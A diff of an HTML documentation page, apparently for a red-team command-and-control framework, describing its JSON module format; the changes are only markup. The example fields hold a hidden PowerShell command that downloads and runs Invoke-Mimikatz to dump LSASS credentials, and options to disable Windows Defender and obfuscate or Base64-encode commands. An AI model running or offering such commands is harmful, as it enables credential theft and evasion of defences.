@@ -1,7 +1,7 @@
 
 
 <!DOCTYPE html>
-<html class="writer-html5" lang="en" >
+<html class="writer-html4" lang="en" >
 <head>
   <meta charset="utf-8">
   
@@ -26,10 +26,10 @@
   
     
       <script type="text/javascript" id="documentation_options" data-url_root="../" src="../_static/documentation_options.js"></script>
-        <script src="../_static/jquery.js"></script>
-        <script src="../_static/underscore.js"></script>
-        <script src="../_static/doctools.js"></script>
-        <script src="../_static/language_data.js"></script>
+        <script type="text/javascript" src="../_static/jquery.js"></script>
+        <script type="text/javascript" src="../_static/underscore.js"></script>
+        <script type="text/javascript" src="../_static/doctools.js"></script>
+        <script type="text/javascript" src="../_static/language_data.js"></script>
     
     <script type="text/javascript" src="../_static/js/theme.js"></script>
 
@@ -203,90 +203,90 @@
 <div class="section" id="base">
 <h2>Base<a class="headerlink" href="#base" title="Permalink to this headline">¶</a></h2>
 <p>The <code class="docutils literal notranslate"><span class="pre">base</span></code> module is required and is the lowest level of describing a module and its function.</p>
-<table class="colwidths-auto docutils align-default" id="id7">
+<table border="1" class="colwidths-auto docutils" id="id7">
 <caption><span class="caption-text">Module Base</span><a class="headerlink" href="#id7" title="Permalink to this table">¶</a></caption>
-<thead>
-<tr class="row-odd"><th class="head"><p>Name</p></th>
-<th class="head"><p>Type</p></th>
-<th class="head"><p>Description</p></th>
-<th class="head"><p>Example</p></th>
+<thead valign="bottom">
+<tr class="row-odd"><th class="head">Name</th>
+<th class="head">Type</th>
+<th class="head">Description</th>
+<th class="head">Example</th>
 </tr>
 </thead>
-<tbody>
-<tr class="row-even"><td><p><a class="reference internal" href="#type">type</a></p></td>
-<td><p>string</p></td>
-<td><p><code class="docutils literal notranslate"><span class="pre">standard</span></code> or <code class="docutils literal notranslate"><span class="pre">extended</span></code></p></td>
-<td><p>“type”: “standard”</p></td>
+<tbody valign="top">
+<tr class="row-even"><td><a class="reference internal" href="#type">type</a></td>
+<td>string</td>
+<td><code class="docutils literal notranslate"><span class="pre">standard</span></code> or <code class="docutils literal notranslate"><span class="pre">extended</span></code></td>
+<td>“type”: “standard”</td>
 </tr>
-<tr class="row-odd"><td><p>name</p></td>
-<td><p>string</p></td>
-<td><p>The name of the module</p></td>
-<td><p>“name”: “MyModuleName”</p></td>
+<tr class="row-odd"><td>name</td>
+<td>string</td>
+<td>The name of the module</td>
+<td>“name”: “MyModuleName”</td>
 </tr>
-<tr class="row-even"><td><p>author</p></td>
-<td><p>array of strings</p></td>
-<td><p>A list of the module’s authors</p></td>
-<td><p>“author”: [“Russel Van Tuyl (&#64;Ne0ndog)”]</p></td>
+<tr class="row-even"><td>author</td>
+<td>array of strings</td>
+<td>A list of the module’s authors</td>
+<td>“author”: [“Russel Van Tuyl (&#64;Ne0ndog)”]</td>
 </tr>
-<tr class="row-odd"><td><p>credits</p></td>
-<td><p>array of strings</p></td>
-<td><p>A list of authors to credit original work leveraged in the module</p></td>
-<td><p>“credits”: [“Joe Bialek (&#64;JosephBialek)”, “Benjamin Delpy (&#64;gentilkiwi)”]</p></td>
+<tr class="row-odd"><td>credits</td>
+<td>array of strings</td>
+<td>A list of authors to credit original work leveraged in the module</td>
+<td>“credits”: [“Joe Bialek (&#64;JosephBialek)”, “Benjamin Delpy (&#64;gentilkiwi)”]</td>
 </tr>
-<tr class="row-even"><td><p>path</p></td>
-<td><p>array of strings</p></td>
-<td><p>The file path to the module</p></td>
-<td><p>“path”: [“C”, “windows”, “system32”]</p></td>
+<tr class="row-even"><td>path</td>
+<td>array of strings</td>
+<td>The file path to the module</td>
+<td>“path”: [“C”, “windows”, “system32”]</td>
 </tr>
-<tr class="row-odd"><td><p>platform</p></td>
-<td><p>string</p></td>
-<td><p>The target platform the module can run on</p></td>
-<td><p>“platform”: “linux”</p></td>
+<tr class="row-odd"><td>platform</td>
+<td>string</td>
+<td>The target platform the module can run on</td>
+<td>“platform”: “linux”</td>
 </tr>
-<tr class="row-even"><td><p>arch</p></td>
-<td><p>string</p></td>
-<td><p>The target architecture the module can run on</p></td>
-<td><p>“arch”: “x64”</p></td>
+<tr class="row-even"><td>arch</td>
+<td>string</td>
+<td>The target architecture the module can run on</td>
+<td>“arch”: “x64”</td>
 </tr>
-<tr class="row-odd"><td><p>lang</p></td>
-<td><p>string</p></td>
-<td><p>The target language the module leverages</p></td>
-<td><p>“lang”: “powershell” or “lang”: “bash”</p></td>
+<tr class="row-odd"><td>lang</td>
+<td>string</td>
+<td>The target language the module leverages</td>
+<td>“lang”: “powershell” or “lang”: “bash”</td>
 </tr>
-<tr class="row-even"><td><p>privilege</p></td>
-<td><p>bool</p></td>
-<td><p>Does the module require elevated privileges?</p></td>
-<td><p>“privilege”: true</p></td>
+<tr class="row-even"><td>privilege</td>
+<td>bool</td>
+<td>Does the module require elevated privileges?</td>
+<td>“privilege”: true</td>
 </tr>
-<tr class="row-odd"><td><p>notes</p></td>
-<td><p>string</p></td>
-<td><p>Miscellaneous notes about the module</p></td>
-<td><p>“notes”: “This module doesn’t work well on Ubuntu 14.04”</p></td>
+<tr class="row-odd"><td>notes</td>
+<td>string</td>
+<td>Miscellaneous notes about the module</td>
+<td>“notes”: “This module doesn’t work well on Ubuntu 14.04”</td>
 </tr>
-<tr class="row-even"><td><p><a class="reference internal" href="#remote">remote</a></p></td>
-<td><p>string</p></td>
-<td><p>The remote path where the script associated with the module can be found</p></td>
-<td><p>“remote”: “<a class="reference external" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1</a>”</p></td>
+<tr class="row-even"><td><a class="reference internal" href="#remote">remote</a></td>
+<td>string</td>
+<td>The remote path where the script associated with the module can be found</td>
+<td>“remote”: “<a class="reference external" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1</a>”</td>
 </tr>
-<tr class="row-odd"><td><p><a class="reference internal" href="#local">local</a></p></td>
-<td><p>array of strings</p></td>
-<td><p>The local file system path where the script associated with the module can be found</p></td>
-<td><p>“local”: [“data”, “src”, “PowerSploit”, “Exfiltration”, “Invoke-Mimikatz.ps1”]</p></td>
+<tr class="row-odd"><td><a class="reference internal" href="#local">local</a></td>
+<td>array of strings</td>
+<td>The local file system path where the script associated with the module can be found</td>
+<td>“local”: [“data”, “src”, “PowerSploit”, “Exfiltration”, “Invoke-Mimikatz.ps1”]</td>
 </tr>
-<tr class="row-even"><td><p><a class="reference internal" href="#options">options</a></p></td>
-<td><p>array of objects</p></td>
-<td><p>The configurable options for the module</p></td>
-<td><p>“options”: [{“name”: “DumpCreds”, “value”: “true”, “required”: false, “description”:”[Switch]Use mimikatz to dump credentials out of LSASS.”}]</p></td>
+<tr class="row-even"><td><a class="reference internal" href="#options">options</a></td>
+<td>array of objects</td>
+<td>The configurable options for the module</td>
+<td>“options”: [{“name”: “DumpCreds”, “value”: “true”, “required”: false, “description”:”[Switch]Use mimikatz to dump credentials out of LSASS.”}]</td>
 </tr>
-<tr class="row-odd"><td><p>description</p></td>
-<td><p>string</p></td>
-<td><p>A description of the module and its function</p></td>
-<td><p>“description”: “this script leverages Mimikatz 2.0 and Invoke-ReflectivePEInjection to reflectively load Mimikatz completely in memory.”</p></td>
+<tr class="row-odd"><td>description</td>
+<td>string</td>
+<td>A description of the module and its function</td>
+<td>“description”: “this script leverages Mimikatz 2.0 and Invoke-ReflectivePEInjection to reflectively load Mimikatz completely in memory.”</td>
 </tr>
-<tr class="row-even"><td><p><a class="reference internal" href="#commands">commands</a></p></td>
-<td><p>array of strings</p></td>
-<td><p>A list of the commands to be executed on the host when running the script</p></td>
-<td><p>“commands”: [“powershell.exe”, “-nop”, “-w”, “0”, “\\”IEX (New-Object Net.WebClient).DownloadString(‘<a class="reference external" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1</a>’);”,”Invoke-Mimikatz”, “{{DumpCreds.Flag}}”, “{{DumpCerts.Flag}}”, “{{Command}}”, “{{ComputerName}}”,”\\””]</p></td>
+<tr class="row-even"><td><a class="reference internal" href="#commands">commands</a></td>
+<td>array of strings</td>
+<td>A list of the commands to be executed on the host when running the script</td>
+<td>“commands”: [“powershell.exe”, “-nop”, “-w”, “0”, “\”IEX (New-Object Net.WebClient).DownloadString(‘<a class="reference external" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1</a>’);”,”Invoke-Mimikatz”, “{{DumpCreds.Flag}}”, “{{DumpCerts.Flag}}”, “{{Command}}”, “{{ComputerName}}”,”\””]</td>
 </tr>
 </tbody>
 </table>
@@ -366,40 +366,40 @@ and point to the module’s exported <code class="docutils literal notranslate">
 <span class="p">}</span>
 </pre></div>
 </div>
-<table class="colwidths-auto docutils align-default" id="id8">
+<table border="1" class="colwidths-auto docutils" id="id8">
 <caption><span class="caption-text">Module Base</span><a class="headerlink" href="#id8" title="Permalink to this table">¶</a></caption>
-<thead>
-<tr class="row-odd"><th class="head"><p>Name</p></th>
-<th class="head"><p>Type</p></th>
-<th class="head"><p>Description</p></th>
-<th class="head"><p>Example</p></th>
+<thead valign="bottom">
+<tr class="row-odd"><th class="head">Name</th>
+<th class="head">Type</th>
+<th class="head">Description</th>
+<th class="head">Example</th>
 </tr>
 </thead>
-<tbody>
-<tr class="row-even"><td><p>name</p></td>
-<td><p>string</p></td>
-<td><p>The name of the option</p></td>
-<td><p>“name”: “ComputerName”</p></td>
+<tbody valign="top">
+<tr class="row-even"><td>name</td>
+<td>string</td>
+<td>The name of the option</td>
+<td>“name”: “ComputerName”</td>
 </tr>
-<tr class="row-odd"><td><p>value</p></td>
-<td><p>string</p></td>
-<td><p>The configured value for the option</p></td>
-<td><p>“value”: “127.0.0.1”</p></td>
+<tr class="row-odd"><td>value</td>
+<td>string</td>
+<td>The configured value for the option</td>
+<td>“value”: “127.0.0.1”</td>
 </tr>
-<tr class="row-even"><td><p>required</p></td>
-<td><p>bool</p></td>
-<td><p>Is this option required?</p></td>
-<td><p>“required”: false</p></td>
+<tr class="row-even"><td>required</td>
+<td>bool</td>
+<td>Is this option required?</td>
+<td>“required”: false</td>
 </tr>
-<tr class="row-odd"><td><p>flag</p></td>
-<td><p>string</p></td>
-<td><p>The command line flag for the option</p></td>
-<td><p>“flag”: “-ComputerName”</p></td>
+<tr class="row-odd"><td>flag</td>
+<td>string</td>
+<td>The command line flag for the option</td>
+<td>“flag”: “-ComputerName”</td>
 </tr>
-<tr class="row-even"><td><p>description</p></td>
-<td><p>string</p></td>
-<td><p>A short description of the option</p></td>
-<td><p>“description”: “The target computer name to run the script on”</p></td>
+<tr class="row-even"><td>description</td>
+<td>string</td>
+<td>A short description of the option</td>
+<td>“description”: “The target computer name to run the script on”</td>
 </tr>
 </tbody>
 </table>
@@ -485,30 +485,30 @@ will return both the flag and value. For example <code class="docutils literal n
 <div class="section" id="powershell">
 <h2>Powershell<a class="headerlink" href="#powershell" title="Permalink to this headline">¶</a></h2>
 <p>The <code class="docutils literal notranslate"><span class="pre">powershell</span></code> module is used to provide additional configuration options that pertain to PowerShell commands. Support for this module type is currently lacking. At this time is being used as placeholder for future development.</p>
-<table class="colwidths-auto docutils align-default" id="id9">
+<table border="1" class="colwidths-auto docutils" id="id9">
 <caption><span class="caption-text">Module Base</span><a class="headerlink" href="#id9" title="Permalink to this table">¶</a></caption>
-<thead>
-<tr class="row-odd"><th class="head"><p>Name</p></th>
-<th class="head"><p>Type</p></th>
-<th class="head"><p>Description</p></th>
-<th class="head"><p>Example</p></th>
+<thead valign="bottom">
+<tr class="row-odd"><th class="head">Name</th>
+<th class="head">Type</th>
+<th class="head">Description</th>
+<th class="head">Example</th>
 </tr>
 </thead>
-<tbody>
-<tr class="row-even"><td><p>disableav</p></td>
-<td><p>bool</p></td>
-<td><p>Should Windows Defender be disabled prior to running the command?</p></td>
-<td><p>“disableav” : true</p></td>
+<tbody valign="top">
+<tr class="row-even"><td>disableav</td>
+<td>bool</td>
+<td>Should Windows Defender be disabled prior to running the command?</td>
+<td>“disableav” : true</td>
 </tr>
-<tr class="row-odd"><td><p>obfuscate</p></td>
-<td><p>bool</p></td>
-<td><p>Should the PowerShell command be obfuscated?</p></td>
-<td><p>“obfuscate”: false</p></td>
+<tr class="row-odd"><td>obfuscate</td>
+<td>bool</td>
+<td>Should the PowerShell command be obfuscated?</td>
+<td>“obfuscate”: false</td>
 </tr>
-<tr class="row-even"><td><p>base64</p></td>
-<td><p>bool</p></td>
-<td><p>Should the command be Base64 encoded?</p></td>
-<td><p>“base64”: true</p></td>
+<tr class="row-even"><td>base64</td>
+<td>bool</td>
+<td>Should the command be Base64 encoded?</td>
+<td>“base64”: true</td>
 </tr>
 </tbody>
 </table>
